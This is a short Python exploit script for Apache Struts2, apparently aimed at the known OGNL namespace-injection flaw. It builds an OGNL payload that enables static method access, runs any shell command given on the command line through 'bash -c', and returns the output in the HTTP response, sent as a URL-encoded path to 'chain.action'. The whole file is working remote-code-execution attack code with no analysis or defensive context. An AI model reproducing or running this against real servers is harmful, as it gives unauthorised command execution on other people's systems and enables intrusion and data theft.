#!/usr/bin/python

import sys
import urllib.request
import urllib.parse
import http.client


def exploit(host,cmd):
    print(f"[Execute]: {cmd}")

    ognl_payload = "${"
    ognl_payload += "(#_memberAccess['allowStaticMethodAccess']=true)."
    ognl_payload += "(#cmd='{}').".format(cmd)
    ognl_payload += "(#cmds=({'bash','-c',#cmd}))."
    ognl_payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    ognl_payload += "(#p.redirectErrorStream(true))."
    ognl_payload += "(#process=#p.start())."
    ognl_payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    ognl_payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    ognl_payload += "(#ros.flush())"
    ognl_payload += "}"

    # encode the payload
    data = urllib.parse.quote(ognl_payload)
    data = data.replace("+","%20").replace(" ", "%20")

    url = f"http://{host}/{data}/chain.action"
    print("[Url]: {}\n\n\n".format(url))

    try:
        with urllib.request.urlopen(url) as response:
            response.read()
    except http.client.IncompleteRead as e:
        response = e.partial
    print(response)

if len(sys.argv) < 3:
    sys.exit('Usage: %s <host:port> <cmd>' % sys.argv[0])
else:
    exploit(sys.argv[1],sys.argv[2])

